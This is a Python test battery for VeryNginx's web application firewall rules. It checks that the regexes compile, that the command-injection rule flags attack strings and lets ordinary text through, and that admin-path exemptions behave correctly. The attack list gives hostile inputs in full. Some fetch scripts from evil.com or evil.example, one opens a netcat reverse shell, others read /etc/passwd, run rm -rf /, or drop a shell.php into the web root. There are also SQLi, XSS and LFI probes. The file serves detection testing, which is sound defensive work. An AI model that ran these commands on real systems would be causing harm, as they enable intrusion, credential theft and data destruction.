#!/usr/bin/env python3
"""
VeryNginx v2 - factory WAF rules battery (v14+)
================================================
Behavioral + structural checks against verynginx/configs/waf-rules.default.json.

Why Python: the busted rig stubs ngx.re with *Lua patterns*
(test/v2/spec/spec_helper.lua), so the real PCRE dialect the engine runs in
nginx cannot be executed inside busted. This script re-runs the shipped
patterns under Python `re` (case-insensitive, mirroring the engine's "i"
compile flag in matcher/compare.lua) against a positive/negative case table.

Coverage:
  1. Every regex-valued condition in the factory matcher tree compiles.
  2. vn_rce_0007: the v14 path/flag argument discriminator — reviewer FP
     battery stays clear, real injection shapes still hit.
  3. The 14 admin-path exemptions accept root paths incl. `.php` entries
     (/adminer.php, /phpminiadmin.php) and still reject nested/lookalike
     paths (/mysql/phpmyadmin/, /tools/adminer.php, /adminerEvil).
  4. Structure: file version, rule version bumps, spam_0019 wording.

Run (repo root):  python3 test/v2/factory_rules_battery.py
Exit code 0 = all pass. CI/gate: run alongside busted + luacheck.
"""

import json
import os
import re
import sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
FACTORY = os.path.join(ROOT, "verynginx", "configs", "waf-rules.default.json")

NEW_EX = r"(?i)^/(?:phpmyadmin|phpminiadmin|adminer)(?:\.php)?(?:/|$)"
OLD_RCE = r"\b\s*[\w/.-]"
NEW_RCE = r"\b\s*(?:[-/]\S*|\S*/\S*|\S*\.[A-Za-z]\S*)"

FAILURES = []


def check(cond, label):
    if cond:
        print(f"  [PASS] {label}")
    else:
        print(f"  [FAIL] {label}")
        FAILURES.append(label)


def find_args(matcher):
    def walk(o):
        if isinstance(o, dict):
            if isinstance(o.get("Args"), dict) and "value" in o["Args"]:
                return o["Args"]["value"]
            for v in o.values():
                f = walk(v)
                if f:
                    return f
        elif isinstance(o, list):
            for v in o:
                f = walk(v)
                if f:
                    return f
        return None
    return walk(matcher)


def regex_values(matcher):
    """Every operator-≈ string value in the matcher tree (the regexes the
    engine will compile under PCRE with flag 'i')."""
    out = []

    def walk(o):
        if isinstance(o, dict):
            if o.get("operator") in ("≈", "!≈") and isinstance(o.get("value"), str):
                out.append(o["value"])
            for v in o.values():
                walk(v)
        elif isinstance(o, list):
            for v in o:
                walk(v)
    walk(matcher)
    return out


def main():
    with open(FACTORY, encoding="utf-8") as f:
        d = json.load(f)
    by = {r["id"]: r for r in d["rules"]}

    # ---- 1. compile-all -------------------------------------------------
    print("== compile: every ≈ regex under re.I ==")
    n = 0
    bad = []
    for r in d["rules"]:
        for pat in regex_values(r.get("matcher") or {}):
            n += 1
            try:
                re.compile(pat, re.I)
            except re.error as e:
                bad.append(f"{r['id']}: {e}")
    check(not bad, f"{n} regexes compile ({'; '.join(bad) if bad else 'ok'})")

    # ---- 2. vn_rce_0007 behavior ---------------------------------------
    print("== vn_rce_0007 (action=%s pri=%s) ==" %
          (by["vn_rce_0007"]["action"], by["vn_rce_0007"]["priority"]))
    rce = find_args(by["vn_rce_0007"]["matcher"])
    check(bool(rce), "args pattern extracted")
    rx = re.compile(rce, re.I)

    fps = [
        "; cat is a pet",              # reviewer P1 example
        "wait; curl the docs",         # reviewer P1 example
        "ok; php 8.3",                 # reviewer P1 example
        "他说：; cat 是宠物",           # CJK chat text, ASCII separator
        "resume; head shoulders",
        "note; rm that file",
        "wait; curl me later",
        "alice;id=5",                  # v12 bare-command guard (must hold)
        "; cat",                       # command without any argument
        "; touch base",
    ]
    for s in fps:
        check(not rx.search(s), f"FP clear: {s!r}")

    attacks = [
        "; cat /etc/passwd",
        "x=$(curl evil.com/x.sh)",
        "; rm -rf /",
        "|wget http://evil.example/payload.sh",
        "; cp shell.php /var/www/html/",
        "; php -r system('id');",
        "; sh -c 'uname -a'",
        ";base64 /etc/passwd",         # no space after ';'
        ";cat</etc/passwd",            # no space, '<' before path
        ";python3 -m http.server",
        "; env PATH=/tmp",             # env with path-valued arg
        "`id`",                        # bare-command branch
        ";whoami",                     # bare-command branch
        "| nc -e /bin/sh 10.0.0.1 4444",
    ]
    for s in attacks:
        check(bool(rx.search(s)), f"attack hits: {s!r}")

    check(OLD_RCE not in rce, "legacy [\\w/.-] discriminator removed")
    check(NEW_RCE in rce, "path/flag discriminator present")

    # ---- 3. admin-path exemptions --------------------------------------
    print("== admin-path exemption regex ==")
    ex_vals = []
    for r in d["rules"]:
        for v in regex_values(r.get("matcher") or {}):
            if "phpmyadmin" in v.lower():
                ex_vals.append((r["id"], v))
    check(len(ex_vals) == 14 and all(v == NEW_EX for _, v in ex_vals),
          f"14 exemptions carry the .php-tolerant pattern ({len(ex_vals)} found)")
    ex = re.compile(NEW_EX, re.I)
    for uri in ["/phpMyAdmin/", "/phpMyAdmin/index.php", "/adminer",
                "/adminer.php", "/adminer.php/server", "/phpminiadmin.php",
                "/phpmyadmin/foo"]:
        check(bool(ex.match(uri)), f"exempt: {uri}")
    for uri in ["/mysql/phpmyadmin/", "/tools/adminer.php", "/adminerEvil",
                "/myadmin/", "/notphpmyadmin/", "/adminer.phpx"]:
        check(not ex.match(uri), f"NOT exempt: {uri}")

    # ---- 4. structure ---------------------------------------------------
    print("== structure ==")
    check(d.get("version") == 14, f"file version == 14 (got {d.get('version')})")
    check(by["vn_spam_0019"]["action"] == "log", "vn_spam_0019 action is log")
    check(by["vn_spam_0019"]["description"].startswith("Logs requests"),
          "vn_spam_0019 description no longer says 'Blocks'")
    check(by["vn_rce_0007"]["version"] >= 5, "vn_rce_0007 version bumped (>=5)")
    check(by["vn_spam_0019"]["version"] >= 5, "vn_spam_0019 version bumped (>=5)")

    # ---- 5. untouched-rule spot checks (regression guards) -------------
    print("== regression spot checks ==")
    sqli1 = re.compile(find_args(by["vn_sqli_0001"]["matcher"]), re.I)
    check(bool(sqli1.search("id=1 union select password from users")),
          "vn_sqli_0001 union hits")
    check(not sqli1.search("the union of select members"),
          "vn_sqli_0001 english phrase clear")
    xss6 = re.compile(find_args(by["vn_xss_0006"]["matcher"]) or "$^", re.I)
    check(bool(xss6.search("javascript:alert(1)")), "vn_xss_0006 alert hits")
    lfi11 = re.compile(find_args(by["vn_lfi_0011"]["matcher"]), re.I)
    check(bool(lfi11.search("php://input")), "vn_lfi_0011 php://input hits")
    check(not lfi11.search("file://intranet-link"), "vn_lfi_0011 v12 FP case clear")

    print()
    if FAILURES:
        print(f"FAILED: {len(FAILURES)} check(s)")
        for f_ in FAILURES:
            print("  -", f_)
        return 1
    print("ALL PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
